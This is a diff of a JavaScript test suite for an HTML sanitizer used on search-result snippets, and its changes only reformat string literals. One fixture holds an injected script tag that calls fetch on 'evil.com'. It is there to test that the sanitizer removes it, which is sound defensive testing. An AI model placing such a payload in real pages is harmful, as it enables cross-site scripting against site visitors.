@@ -217,7 +217,8 @@ describe('sanitizeHtml', () => {
 
   describe('Real-world Fess Snippet Examples', () => {
     it('should handle typical search snippet with highlighting', () => {
-      const dirty = 'This is a <em>search</em> result with <strong>important</strong> keywords highlighted.';
+      const dirty =
+        'This is a <em>search</em> result with <strong>important</strong> keywords highlighted.';
       const clean = sanitizeHtml(dirty);
       expect(clean).toBe(dirty); // Should remain unchanged
     });
@@ -230,7 +231,8 @@ describe('sanitizeHtml', () => {
     });
 
     it('should sanitize snippet with injected script', () => {
-      const dirty = 'Normal content <em>highlighted</em><script>fetch("evil.com")</script> more content';
+      const dirty =
+        'Normal content <em>highlighted</em><script>fetch("evil.com")</script> more content';
       const clean = sanitizeHtml(dirty);
       expect(clean).toContain('Normal content');
       expect(clean).toContain('<em>highlighted</em>');
